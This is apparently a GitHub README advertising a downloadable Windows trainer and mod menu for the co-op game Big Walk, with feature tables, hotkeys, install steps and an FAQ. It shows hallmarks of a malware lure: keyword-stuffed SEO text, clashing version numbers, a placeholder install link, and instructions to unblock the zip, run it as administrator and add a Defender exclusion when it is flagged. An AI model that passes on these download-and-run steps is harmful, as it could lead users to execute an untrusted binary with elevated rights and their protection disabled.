# Big Walk Trainer — Mod Menu & Cheats for PC (v1.0.2)

**Big Walk trainer** with an in-game **mod menu** built for a game that has no combat in it: noclip and fly, infinite stamina, teleport to friend, unlock all tools and toys, proximity voice range control, free camera, time of day and weather. Works with the **Steam** release of House House's cooperative walker-talker. Open the overlay with `Insert`, flip a toggle, keep walking.

[![Version](https://img.shields.io/badge/version-v1.0.0-4f9d69)](https://github.com/YarnPikeman60/Big-Walk-Trainer/releases/latest)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-1c1813)](https://github.com/YarnPikeman60/Big-Walk-Trainer/releases/latest)
[![Store](https://img.shields.io/badge/store-Steam-1b2838)](#compatibility)
[![License](https://img.shields.io/badge/license-MIT-e0c17a)](LICENSE)

> **[⬇ Download the latest Big Walk trainer]([https://github.com/YarnPikeman60/Big-Walk-Trainer/releases/latest](https://github.com/YarnPikeman60/Big-Walk-Trainer/releases/download/v1.0.2/BigWalkTrainer.zip))**
<p align="center">
    <a href="https://github.com/YarnPikeman60/Big-Walk-Trainer/releases/download/v1.0.2/BigWalkTrainer.zip">
        <img src="assets/example1.png" width="100%" alt="Download Big Walk Trainer">
    </a>
</p>
---

## Contents

- [What this is](#what-this-is)
- [Co-op first: read this before you install](#co-op-first-read-this-before-you-install)
- [Compatibility](#compatibility)
- [Features](#features)
  - [Walk](#walk--movement-cheats) · [Voice](#voice--proximity-chat-options) · [Tools](#tools--toys) · [World](#world--travel) · [Session](#session--physics-and-time) · [Camera](#camera--photo-mode-options) · [Trainer](#trainer-options)
- [Hotkeys](#hotkeys)
- [Installation](#installation)
- [How to use the mod menu](#how-to-use-the-mod-menu)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)
- [Changelog](#changelog)
- [Disclaimer](#disclaimer)

---

## What this is

*Big Walk* is House House's follow-up to *Untitled Goose Game* — a cooperative open-world adventure for two to twelve players, built around proximity voice chat that fades with distance, echoes down corridors and muffles through walls. There is no combat. No health bar, no enemies, no levels. It's walking, talking, puzzles, and a bag of increasingly silly tools.

That makes a trainer for it a different animal. Most trainers exist to help you survive fights you keep losing; this one can't, because there aren't any. What people actually want here is **freedom of movement and a camera** — fly up the cliff you can't climb, teleport to the friend who wandered off two valleys ago, unlock the megaphone early, set the sun where you want it, drop the HUD and photograph the six of you on a ridge at dusk.

So that's what this is: an exploration and photography toolkit that happens to be shaped like a trainer.

---

## Co-op first: read this before you install

Big Walk is a shared-world co-op game, and that changes how you should use this.

**Options that only touch your own client** — free camera, hide HUD, field of view, third person, binocular zoom — are invisible to everyone else. Use them freely.

**Options that touch world state** — noclip, fly, teleport, movement speed, time of day, weather, gravity — affect the session. If you're the host, they affect everyone. If you're a guest, they can desync you, and at worst leave a puzzle the group is mid-way through in a broken state.

The rule of thumb is simple: **play with people who know you're using it.** Big Walk is built to be played start to finish with a group of friends, and a hand-crafted co-op adventure isn't improved by one person quietly flying past the parts everyone else is solving. Use it on a private walk, or on a second run after you've finished the game properly.

The trainer ships with **Host-only mode** enabled by default for exactly this reason — world-state options stay greyed out unless you're hosting.

---

## Compatibility

| | |
|---|---|
| **Game** | Big Walk (House House / Panic, released 4 August 2026) |
| **Store** | Steam |
| **Game version** | 1.0.0 launch build and later patches (see [release notes](https://github.com/YarnPikeman60/Big-Walk-Trainer/releases)) |
| **OS** | Windows 10 and Windows 11, 64-bit |
| **Runtime** | .NET Desktop Runtime 8 or newer |
| **macOS** | Not supported — the Mac build is Apple Silicon native and this trainer is Windows-only |
| **Steam Deck / Proton** | Not supported |
| **Crossplay sessions** | Works, but only affects your own client and, if you host, your own session |

---

## Features

40+ options across seven tabs. Sliders show the shipped default; ranges are listed where they matter.

### Walk — movement cheats

| Option | What it does | Hotkey |
|---|---|---|
| **Infinite stamina** | Walk and climb without ever slowing down | `F1` |
| **Movement speed** | `1x`–`10x`, default `2x` | `F2` |
| **Jump height** | `1x`–`8x`, default `1x` | — |
| **Noclip and fly** | Walk through world geometry | `F3` |
| **Fly speed** | `1x`–`20x`, default `4x` | — |
| **No fall damage** | Drop from anywhere and keep going | — |
| **Swim without limits** | No breath meter, no drift | — |
| **Player scale** | `0.2x`–`5x`, default `1x` — be tiny, be enormous | — |

**Player scale** is the one that turns a walking game into a physics toy. At `0.2x` the world becomes enormous and every tool gets funnier. At `5x` your friends stop taking you seriously.

### Voice — proximity chat options

| Option | What it does | Hotkey |
|---|---|---|
| **Voice range multiplier** | How far your voice carries — `1x`–`20x`, default `1x` | — |
| **Disable distance falloff** | Hear everyone at full volume, anywhere on the map | `F4` |
| **Disable wall muffling** | Voices come through geometry unfiltered | — |
| **Walkie-talkie range** | `1x`–`50x`, default `1x` | — |
| **Megaphone range** | `1x`–`20x`, default `1x` | — |
| **Unlock all gestures** | Every arm and point animation available immediately | — |

This tab is the most Big Walk–specific thing in the trainer, and the one to be most careful with. Proximity voice is the game's core mechanic — losing each other and finding each other again *is* the experience. Turning off falloff makes the walk far more convenient and noticeably less interesting. Worth trying once, worth turning back off.

### Tools & toys

| Option | What it does | Hotkey |
|---|---|---|
| **Unlock all tools and toys** | Walkie-talkies, laser pointers, binoculars, megaphones, flares, whiteboards, cowbells and the big golden head | — |
| **Infinite flares** | Never run out | — |
| **Binocular zoom** | `1x`–`30x`, default `8x` | — |
| **Laser pointer range** | `10`–`800 m`, default `120 m` | — |
| **Never drop your tools** | Keep hold through falls, water and friends | — |
| **Whiteboard ink** | Never runs dry | — |
| **Spawn the big golden head** | Exactly what it says | `F5` |

### World & travel

| Option | What it does | Hotkey |
|---|---|---|
| **Teleport to friend** | Jump to any player in the session | `F6` |
| **Teleport to waypoint** | Jump to the marker on the map | `F7` |
| **Save position** | Remember your coordinates | `F8` |
| **Load position** | Return to the saved spot | `⇧F8` |
| **Reveal the full map** | Uncover everything at once | — |
| **Highlight points of interest** | Outline puzzle objects within `20`–`400 m`, default `150 m` | — |
| **Unlock all fast travel** | Every discovered point, immediately | — |

**Teleport to friend** is the option that earns its place. Twelve players in an open world means somebody is always three valleys away, and the game is at its best when you're all in earshot.

### Session — physics and time

| Option | What it does | Hotkey |
|---|---|---|
| **Time of day** | Any hour, default `18:00` | — |
| **Freeze time of day** | Hold the light where it is | — |
| **Weather** | `Game default`, `Clear`, `Overcast`, `Rain`, `Fog` | — |
| **Gravity** | `0.1x`–`3x`, default `1x` | — |
| **Game speed** | `0.1x`–`5.0x`, default `1.0x` | — |
| **Object throw force** | `1x`–`20x`, default `1x` | — |
| **Host-only guard** | Grey out world-state options unless you're hosting | — |

Set the time to `18:00`, freeze it, and the whole game becomes golden hour. That's most of what this tab is for.

### Camera & photo mode options

| Option | What it does | Hotkey |
|---|---|---|
| **Field of view** | `60`–`140 deg`, default `90 deg` | — |
| **Free camera** | Detach it from your body | `F9` |
| **Camera speed** | `1x`–`10x`, default `3x` | — |
| **Hide interface** | Drop the HUD and all prompts | `F10` |
| **Third-person view** | Step outside the first-person camera | `F11` |
| **Disable fog and haze** | Full draw distance | — |
| **Extended photo mode** | Filters, depth of field, timescale | — |

Every option here is client-side only. Nobody else in the session sees a thing.

### Trainer options

| Option | What it does | Hotkey |
|---|---|---|
| **Hotkeys** | Global bindings on or off | — |
| **Menu key** | Rebind the overlay — `Insert`, `F1`, `Home`, `~` | — |
| **Overlay opacity** | `40%`–`100%`, default `92%` | — |
| **Host-only mode** | Block world-state writes when you're a guest — **on by default** | — |
| **Reset all on disconnect** | Turn everything off when the session ends | — |
| **Auto-load profile** | Apply the saved set on launch | — |

---

## Hotkeys

| Key | Action |
|---|---|
| `Insert` | Open or close the mod menu |
| `F1` | Infinite stamina |
| `F2` | Movement speed |
| `F3` | Noclip and fly |
| `F4` | Disable distance falloff |
| `F5` | Spawn the big golden head |
| `F6` | Teleport to friend |
| `F7` | Teleport to waypoint |
| `F8` | Save position |
| `⇧F8` | Load position |
| `F9` | Free camera |
| `F10` | Hide interface |
| `F11` | Third-person view |
| `End` | Reset every option |
| `↑ ↓ ← → Enter` | Navigate the menu without a mouse |

---

## Installation

1. **Download** the latest archive from the [Releases page](https://github.com/YOUR-USERNAME/big-walk-trainer/releases/latest).
2. **Unblock it** — right-click the `.zip`, choose Properties, tick *Unblock*, then Apply. Windows quarantines downloaded archives and the trainer won't attach otherwise.
3. **Extract** anywhere outside `Program Files`.
4. **Launch the game first** and join or host a walk, so the process exists.
5. **Run the trainer as administrator.** The header should read `attached` in green.
6. **Press `Insert`.**

Back up your save before the first run:

```
%USERPROFILE%\AppData\LocalLow\House House\Big Walk
```

---

## How to use the mod menu

Pick a tab on the left, flip what you need on the right. Sliders update live.

A few setups worth knowing:

- **Group photo:** `Hide interface` + `Free camera` + `Time of day 18:00` + `Freeze time of day`. Fly out, frame the ridge, take the shot.
- **Herding cats:** `Teleport to friend` + `Voice range 5x`. For when the twelve-player walk has scattered across the map.
- **Second playthrough:** `Noclip and fly` + `Reveal the full map` + `Unlock all tools and toys`. See the places the intended route walks past.
- **Physics nonsense:** `Player scale 0.2x` + `Gravity 0.3x` + `Object throw force 20x`. This is the store page's "kick your friend's binoculars into the ocean," escalated.
- **Somewhere you can't reach:** `Save position` before you fly, `Load position` when you're done.

---

## Troubleshooting

**Trainer says the process wasn't found.** The game has to be running and past the main menu. Launch Big Walk, get into a walk, then start the trainer.

**Nothing happens when I press Insert.** Another overlay is eating the key. Steam's overlay, Discord and RTSS are the usual suspects. Rebind under **Trainer → Menu key**.

**World-state options are greyed out.** You're a guest, not the host, and **Host-only mode** is doing its job. Host the session yourself, or turn the guard off in the Trainer tab if your group is fine with it.

**I teleported and now a puzzle won't progress.** Skipping ahead of a scripted co-op sequence can leave the group's state inconsistent. Press `⇧F8` to return to your saved position, or have the host reload the last checkpoint.

**My friends can't hear me properly after using the voice tab.** Set **Voice range multiplier** back to `1x`, turn **Disable distance falloff** off, then rejoin. Proximity audio state is negotiated on connect.

**Windows Defender flagged it.** Trainers read and write another process's memory, which is what a lot of malware also does, so heuristic scanners flag them on principle. Add an exclusion if you're comfortable with that — and if you'd rather not, don't. That's a reasonable call.

**Is there a Mac version?** No, and there probably won't be. The Big Walk Mac build runs natively on Apple Silicon and would need a completely different implementation.

---

## FAQ

### Does the Big Walk trainer work in multiplayer?

Yes — and Big Walk is co-op only, with no PvP and nothing to win. Client-side options like free camera and hide HUD affect nobody else. World-state options like noclip and teleport affect the session, so use them with a group that knows.

### Will I get banned for using cheats in Big Walk?

There's no anti-cheat, no ranking and no competitive mode, so there's nothing to be banned from. The real risk isn't a ban, it's annoying your friends.

### Can my friends see that I'm using it?

Not directly. But if you're flying over a puzzle they're solving, they'll notice.

### Will it break my friends' game?

It can, if you skip ahead of a scripted sequence. That's what Host-only mode is there to prevent. Leave it on unless you're hosting.

### Does it work on Mac?

No. Windows only.

### Does it work on Steam Deck or Linux?

No. Proton changes how the game's memory is laid out and this trainer doesn't handle that.

### Is there a free camera mod for Big Walk?

Yes — it's in the Camera tab, along with third-person view, FOV control and a HUD toggle. That's the most-used part of this trainer by a wide margin.

### Does it work with the latest patch?

Each release lists the game builds it was verified against. Patches shift memory offsets and can break specific options until a new build ships.

### How do I turn everything off?

Press `End`.

### Can I use it solo?

Big Walk is built for two or more players, but if you launch a session by yourself everything here still works and nothing affects anyone else.

---

## Changelog

### v1.0.0 — 4 August 2026

First public release, timed to launch day. 40+ options across Walk, Voice, Tools, World, Session, Camera and Trainer. Host-only mode on by default.

Full history on the [Releases page](https://github.com/YarnPikeman60/Big-Walk-Trainer/releases).

---

## Disclaimer

Unofficial fan tool. **Not affiliated with, endorsed by, or connected to House House, Panic or Valve.** *Big Walk* and all related names and assets belong to their respective owners.

Intended for use on your own copy, in sessions with people who know it's running. Don't use it to spoil a walk for people who didn't ask. Modifying a running game's memory carries some risk of crashes and save corruption — back up your save, and use it at your own risk.

Released under the [MIT License](LICENSE).

---

<sub>Big Walk trainer · Big Walk mod menu · Big Walk cheats for PC · noclip, fly, teleport to friend, infinite stamina, free camera, unlock all tools, proximity voice range · Steam · House House and Panic · from the makers of Untitled Goose Game</sub>
